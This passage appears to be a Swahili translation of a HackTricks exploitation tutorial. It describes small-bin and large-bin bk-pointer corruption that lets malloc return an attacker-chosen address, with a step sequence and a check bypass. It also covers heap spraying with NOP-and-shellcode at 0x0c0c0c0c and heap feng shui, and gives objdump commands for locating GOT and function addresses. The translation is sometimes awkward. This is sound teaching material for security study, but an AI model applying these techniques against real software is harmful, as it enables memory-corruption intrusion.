Kipande cha malloc kinachotolewa na mtumiaji kinapaswa kuwa chini ya udhibiti wa mtumiaji.

Lengo ni kama ifuatavyo, ikiwa tunaweza kujaza kipande cha heap ambacho kina kipande kilichotolewa na kipo kwenye bin yake, tunaweza kubadilisha kidole chake cha bk. Ikiwa tunabadilisha kidole chake cha bk na kipande hiki kinakuwa cha kwanza kwenye orodha ya bin na kinachotolewa, bin itadanganywa na kuambiwa kuwa kipande cha mwisho cha orodha (kinachofuata) kiko kwenye anwani bandia ambayo tumeweka (kwenye stack au GOT kwa mfano). Kwa hivyo, ikiwa kipande kingine kinatolewa na mtumiaji na mtumiaji ana ruhusa juu yake, atapewa kipande kwenye anwani inayotaka na ataweza kuandika ndani yake.

Baada ya kipande kilichobadilishwa kuachiliwa, ni muhimu kuweka kipande kikubwa kuliko kilichotolewa, ili kipande kilichobadilishwa kiweze kutoka kwenye unsorted bins na kuingizwa kwenye bin yake.

Baada ya kuwa kwenye bin yake, ni wakati wa kubadilisha kidole chake cha bk kupitia kujaa ili kiashiria kwenye anwani tunayotaka kusuluhisha.

Kwa hivyo, bin italazimika kusubiri hadi wito wa malloc() ufanyike mara kadhaa ili bin iliyobadilishwa iweze kutumika tena na kudanganya bin kuamini kuwa kipande kinachofuata kiko kwenye anwani bandia. Kisha kipande kinachotakiwa kitatolewa.

Ili kutekeleza udhaifu haraka iwezekanavyo, ni bora: Kuweka kipande kinachoweza kudhurika, kuweka kipande ambacho kitabadilishwa, kuachilia kipande hiki, kuweka kipande kikubwa kuliko kinachobadilishwa, kubadilisha kipande (udhaifu), kuweka kipande cha ukubwa sawa na kilichovunjwa na kuweka kipande cha pili cha ukubwa sawa na hicho na hii itakuwa inayoelekeza kwenye anwani iliyochaguliwa.

Ili kulinda shambulio hili, uthibitisho wa kawaida kwamba kipande "si" bandia hutumiwa: inathibitisha ikiwa bck->fd inaelekeza kwa mwathirika. Yaani, katika kesi yetu, ikiwa kidole cha fd* cha kipande bandia kinacholengwa kwenye stack kinamaanisha mwathirika. Ili kuvunja ulinzi huu, mshambuliaji lazima aweze kuandika kwa njia fulani (labda kwenye stack) kwenye anwani sahihi ya mwathirika. Ili ionekane kama kipande halisi.

**Uharibifu wa LargeBin**

Mahitaji sawa na hapo awali yanahitajika na zaidi, na vipande vilivyowekwa lazima viwe vikubwa kuliko 512.

Shambulio ni kama hapo awali, yaani, lazima ubadilishe kidole cha bk na unahitaji wito wote wa malloc huo, lakini pia lazima ubadilishe ukubwa wa kipande kilichobadilishwa ili ukubwa huo - nb iwe < MINSIZE.

Kwa mfano, unaweza kuweka ukubwa kuwa 1552 ili 1552 - 1544 = 8 < MINSIZE (tofauti haiwezi kuwa hasi kwa sababu inalinganisha nambari isiyosainiwa).

Pia, kuna marekebisho yaliyofanywa ili kuifanya iwe ngumu zaidi.

**Heap Spraying**

Kimsingi inahusisha kuweka akiba ya kumbukumbu yote inayowezekana kwa heaps na kuzijaza na safu ya nops zilizomalizika na shellcode. Kama akiba, 0x0c hutumiwa. Kwa hivyo, jaribio litakuwa kusonga kwenye anwani 0x0c0c0c0c, na kwa hivyo ikiwa anwani yoyote ambayo wito utafanywa na safu hii ya nops imebadilishwa, itasonga hapo. Kimsingi mkakati ni kuweka kiasi kikubwa iwezekanavyo ili kuona ikiwa kidole chochote kinafutwa na kuruka kwa 0x0c0c0c0c, tukitarajia kuwa kuna nops hapo.

**Heap Feng Shui**

Inahusisha kusambaza kumbukumbu kwa kutumia akiba na kuachilia ili kuacha vipande vilivyowekwa kati ya vipande vilivyowekwa. Buffer ya kujaza itawekwa kwenye moja ya vipande hivi.

**objdump -d executable** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCTION** ‚Äî> Pata anwani ya kazi\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Ili kuona ikiwa ni shellcode yetu na kupata OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Jedwali la alama, kupata anwani za pembejeo na kazi\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Kupata anwani za kazi za maktaba (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Inapata anwani ya puts ya kubadilisha kwenye GOT\
**objdump -D ./exec** ‚Äî> Disas ALL hadi kuingia kwenye plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info ya kazi katika gdb

## Kozi za Kuvutia

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Marejeo**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
